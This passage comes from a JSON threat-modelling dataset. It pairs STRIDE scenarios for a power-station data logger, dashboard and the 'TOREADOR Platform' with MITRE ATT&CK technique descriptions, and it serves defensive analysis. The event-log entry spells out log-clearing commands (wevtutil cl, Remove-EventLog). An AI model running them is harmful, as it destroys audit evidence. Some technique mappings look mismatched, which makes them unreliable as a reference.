                "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",
                "id": "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f",
                "technique_id": "T1556.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Vulnerabilities in the Data Logger's software allow the attacker to escalate privileges from a normal user to root.",
            "Assumptions": [
                {
                    "Assumption": "The Data Logger has known software vulnerabilities.",
                    "Role": "System Security",
                    "Condition": "Unpatched software flaws."
                },
                {
                    "Assumption": "The system lacks comprehensive privilege separation.",
                    "Role": "System Developer",
                    "Condition": "Inadequate privilege separation."
                },
                {
                    "Assumption": "No continuous vulnerability scanning and patch management.",
                    "Role": "System Administrator",
                    "Condition": "Absence of vulnerability management."
                }
            ],
            "Potential Impact": "Full control over the data logging process, risking data integrity and potential undetected data tampering.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "data logger",
                "root access",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider abuses legitimate access to gain unauthorized control over critical system functions.",
            "Assumptions": [
                {
                    "Assumption": "Insufficiently defined role-based access control.",
                    "Role": "System Administrator",
                    "Condition": "Weak RBAC policies."
                },
                {
                    "Assumption": "No segregation of duties in place.",
                    "Role": "System Architect",
                    "Condition": "Poor segregation of duties."
                },
                {
                    "Assumption": "Inadequate monitoring and logging of sensitive functions.",
                    "Role": "System Auditor",
                    "Condition": "Lack of sensitive function monitoring."
                }
            ],
            "Potential Impact": "Abuse of critical functions leading to operational disruptions and potential security breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "unauthorized control",
                "system functions"
            ],
            "mitre_technique": {
                "name": "Create or Modify System Process",
                "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
                "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
                "technique_id": "T1543"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofing sensor data sent to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the sensor network.",
                    "Role": "Attacker",
                    "Condition": "Physical access to power station site."
                },
                {
                    "Assumption": "The system does not use strong cryptographic methods to verify sensor data integrity.",
                    "Role": "System architect",
                    "Condition": "Inadequate cryptographic protection."
                }
            ],
            "Potential Impact": "Unauthorized data could lead to incorrect predictions, impacting both data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "sensor network",
                "data integrity",
                "data injection"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofing the identity of a receiver to intercept and modify data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network path between the Data Logger and Receiver.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                },
                {
                    "Assumption": "The existing network does not have strong mutual authentication mechanisms.",
                    "Role": "Network administrator",
                    "Condition": "Lack of mutual authentication."
                }
            ],
            "Potential Impact": "Compromised data integrity and potential information disclosure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network",
                "data modification"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofing a legitimate user to gain access to the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained valid user credentials through phishing or other means.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials."
                },
                {
                    "Assumption": "The system lacks multi-factor authentication.",
                    "Role": "System administrator",
                    "Condition": "Single-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data, impacting data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "dashboard",
                "user impersonation"
            ],
            "mitre_technique": {
                "name": "Container and Resource Discovery",
                "description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ",
                "id": "attack-pattern--0470e792-32f8-46b0-a351-652bc35e9336",
                "technique_id": "T1613"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware of the Data Logger to alter collected data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Physical access."
                },
                {
                    "Assumption": "Firmware updates are not securely verified.",
                    "Role": "Firmware developer",
                    "Condition": "Lack of secure firmware verification."
                }
            ],
            "Potential Impact": "Corruption of data integrity, leading to incorrect AI/ML model predictions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "data logger",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data transmitted from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network path.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                },
                {
                    "Assumption": "Transmitted data is not encrypted.",
                    "Role": "Network administrator",
                    "Condition": "Lack of encryption."
                }
            ],
            "Potential Impact": "Altered data leading to incorrect predictive maintenance, impacting system reliability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data modification",
                "network",
                "predictive maintenance"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the training data in the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised access to the cloud environment.",
                    "Role": "Attacker",
                    "Condition": "Cloud access."
                },
                {
                    "Assumption": "Data integrity checks are insufficient.",
                    "Role": "Cloud service provider",
                    "Condition": "Inadequate integrity checks."
                }
            ],
            "Potential Impact": "Corrupted AI/ML model integrity leading to unreliable predictions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud environment",
                "AI/ML models",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Cloud API",
                "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
                "id": "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf",
                "technique_id": "T1059.009"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing actions on the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The system does not keep detailed activity logs.",
                    "Role": "System administrator",
                    "Condition": "Lack of comprehensive logging."
                },
                {
                    "Assumption": "Logs can be altered or deleted by privileged users.",
                    "Role": "Privileged user",
                    "Condition": "Log alteration."
                }
            ],
            "Potential Impact": "Difficult to trace user actions, compromising accountability and non-repudiation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "activity logs",
                "dashboard",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies sending fraudulent data from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "There is no message authentication or logging on data transmissions.",
                    "Role": "System architect",
                    "Condition": "Lack of message authentication."
                },
                {
                    "Assumption": "Network communications are not logged with timestamps.",
                    "Role": "Network administrator",
                    "Condition": "Lack of transmission logging."
                }
            ],
            "Potential Impact": "Difficulty in identifying the source of tampered data, reducing traceability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data transmission",
                "logging",
                "traceability"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious insider denies making unauthorized changes to the AI/ML models.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks role-based access controls and logging of model changes.",
                    "Role": "System administrator",
                    "Condition": "Insufficient access controls and logging."
                },
                {
                    "Assumption": "Model changes can be made without proper change control processes.",
                    "Role": "Developer",
                    "Condition": "Lack of change control processes."
                }
            ],
            "Potential Impact": "Difficult to hold individuals accountable, leading to potential data and model integrity issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "model changes",
                "access control",
                "insider threats"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensor data during transmission from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Transmission channels are not encrypted.",
                    "Role": "Network administrator",
                    "Condition": "Unencrypted transmission."
                },
                {
                    "Assumption": "The attacker has access to the network path.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive sensor data, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data transmission",
                "network",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to anonymized data before it is processed by the Anonymity Agent.",
            "Assumptions": [
                {
                    "Assumption": "The attacker intrudes into the data flow before it reaches the Anonymity Agent.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                },
                {
                    "Assumption": "There are insufficient access controls on the data pre-processing phase.",
                    "Role": "System architect",
                    "Condition": "Inadequate pre-processing access controls."
                }
            ],
            "Potential Impact": "Exposure of sensitive data before anonymization, affecting data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data pre-processing",
                "anonymity agent",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to the metadata managed by the system.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is accessible through the network without strong access controls.",
                    "Role": "Network administrator",
                    "Condition": "Weak access control mechanism."
                },
                {
                    "Assumption": "The attacker has access to the system network.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Access to operational and ownership details, compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "network",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "The platform is accessible via the internet.",
                    "Role": "Attacker",
                    "Condition": "Internet access."
                },
                {
                    "Assumption": "Insufficient DDoS protection mechanisms are in place.",
                    "Role": "IT infrastructure manager",
                    "Condition": "Lack of DDoS mitigation strategies."
                }
            ],
            "Potential Impact": "Disruption of system availability, affecting real-time predictions and operations.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "TOREADOR platform",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
